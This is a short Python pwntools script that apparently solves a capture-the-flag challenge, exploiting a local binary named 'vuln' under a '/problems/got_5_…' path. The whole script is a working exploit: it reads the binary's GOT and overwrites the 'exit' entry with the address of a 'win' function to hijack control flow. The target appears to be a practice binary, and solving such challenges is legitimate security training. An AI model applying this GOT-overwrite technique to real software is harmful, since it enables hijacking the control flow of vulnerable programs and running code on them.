import os;os.environ['TMPDIR'] = os.path.join(os.environ['HOME'], 'tmp')
import pwn

remote_binary = "/problems/got_5_c5119617c90aa544a639812dbc41e24e/vuln"

def segfault():
    try:
        pr = pwn.process(remote_binary)
        elf = pwn.ELF(remote_binary, False)
        print(elf.got)
        pr.sendlineafter("Input address\n", str(elf.got["exit"]))
        pr.sendlineafter("Input value?\n", str(elf.sym["win"]))
        rsp = pr.readall(timeout=0.5)
        print(rsp)
    finally:
        pr.close()

segfault()
